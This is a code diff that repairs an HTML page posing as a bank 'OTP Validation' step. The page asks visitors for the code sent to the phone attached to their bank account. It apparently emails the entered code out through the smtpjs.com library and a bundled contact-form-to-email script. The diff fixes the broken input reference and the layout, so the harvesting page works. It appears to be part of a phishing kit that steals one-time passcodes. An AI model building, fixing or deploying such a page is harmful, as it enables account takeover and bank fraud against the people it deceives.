@@ -3,23 +3,18 @@
 
 <head>
   <meta charset="UTF-8" />
-  <link rel="icon" type="img" href="fcan-logo-transp.png" />
-
-
+  <link rel="icon" type="image/png" href="fcan-logo-transp.png" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Home</title>
-
-
-
 
   <script type="text/javascript">
     window.onload = function () {
       console.log('working');
-      const btn = document.querySelector('button')
-      const phoneInput = document.querySelector('#email')
+      const btn = document.querySelector('button');
+      const phoneInput = document.querySelector('#email');
       document.getElementById('form').addEventListener('submit', function (event) {
         btn.textContent = 'Loading...';
-        localStorage.setItem('email', emailInput.value)
+        localStorage.setItem('email', phoneInput.value);
       });
     }
   </script>
@@ -34,9 +29,7 @@
     
       <form id="form" onsubmit="emailSend(); reset(); return false;" class="mt-44">
 
-
-      <input type="hidden" name="_captcha" value="false">
-      <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-61">
+      <div class="inputsCtn bg-white rounded-md shadow-sm p-6 flex flex-col gap-6">
         <p class="font-bold text-xl mb-3">OTP Validation</p>
         <p>We've sent a code to the phone number attached to your bank account. Enter the code here</p>
         <div class="ctn relative">
@@ -47,8 +40,8 @@
         </div>
 
         
-        <p class="pt-7 text-primary font-semibold text-centerr">Resend OTP</p>
-        <div class="spacee"></div>
+        <p class="pt-7 text-primary font-semibold text-center">Resend OTP</p>
+        <div class="space"></div>
         <button class="bg-primary text-white w-full rounded-md p-4 disabled:opacity-80">Next</button>
 
       </div>
@@ -56,19 +49,16 @@
     </form>
   </div>
 
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
+  <script src="Contact-form-to-email1.js2"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <script>
+    function togglePass() {
+      const passInput = document.querySelector('#pass');
+      let type = passInput.type === "password" ? "text" : "password";
+      passInput.setAttribute("type", type);
+    }
+  </script>
 
 </body>
-
-        <script src="https://smtpjs.com/v3/smtp.js"
-        </script>
-        <script src="Contact-form-to-email1.js2"></script>
-        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-<script>
-  function togglePass() {
-    const passInput = document.querySelector('#pass')
-    let type = passInput.type === "password" ? "text" : "password"
-    passInput.setAttribute("type", type)
-  }
-</script>
-
 </html>
